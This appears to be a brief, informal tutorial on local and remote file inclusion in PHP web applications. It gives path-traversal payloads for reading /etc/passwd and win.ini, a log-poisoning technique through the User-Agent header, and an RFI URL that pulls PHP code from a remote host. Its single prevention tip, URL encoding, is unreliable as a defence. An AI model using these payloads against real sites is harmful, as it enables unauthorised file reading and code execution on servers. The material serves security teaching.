File Inclusion:
===
File inclusion is a web security vulnerability 
in which user supplied data is include in include() without sanitization on the web application.

File inclusion is classified as two types:

1.LFI(Local file inclusion)

2.RFI(Remote File Inclusion)

<h3>LFI</h3>

Local File Inclusion (LFI) allows an attacker to include local files on a server through the web browser. 
This vulnerability exists when a web application includes a file without correctly sanitising the input, 
allowing and attacker to manipulate the input and inject path traversal characters and include other files from the web server.
it is done via relative or full path we have to check which is accesible.

<h3>Identification & EXPLOITATION</h3>

LFI vulnerabilities are easy to identify and exploit. Any script that includes a file from a web server is a good candidate for further LFI testing, 
For example:

               /script.php?page=/windows/win.ini
     
Internally we check log file in "/xampp/apache/logs/access.log "
we will find the user contrallable data in the present activity,then paste the code in user contralable field such as "USER AGENT:"
in the last paste the path of access.log in web browser and in result the code will be executed.

<h3>In linux</h3>
A penetration tester would attempt to exploit this vulnerability by manipulating the file location parameter, 
such as:

           /script.php?page=../../../../../../../../etc/passwd

The above is an effort to display the contents of the /etc/passwd file on a UNIX / Linux based system.

RFI
===
A remote file inclusion (RFI) occurs when a file from a remote web server is inserted into a web page. 
This can be done on purpose to display content from a remote web application.In this we will only used full path. 

<h3>Identification & Exploitation</h3>

1.Go to your target website and find any parameter that loads the content of any remote websites
for eg. url, page, file etc. (Use Spider option of burp for finding parameters)

2.suppose we find vulnerbaility in "page" parameter

For example:

     /script.php?page=http://www.webhosted.com/b0x.txt 


Note:- If we find any problem or application not allow to fetch data then we will ecxploit it in burp suite
and can fetch the data from the remote URL.

if we are appending php code in the b0x file then we have to save it as .txt file on the internet based server.
This is how we can exploit RFI.

prevention:

1.url encodig in relative path


THANKS
ROHIT TANWAR






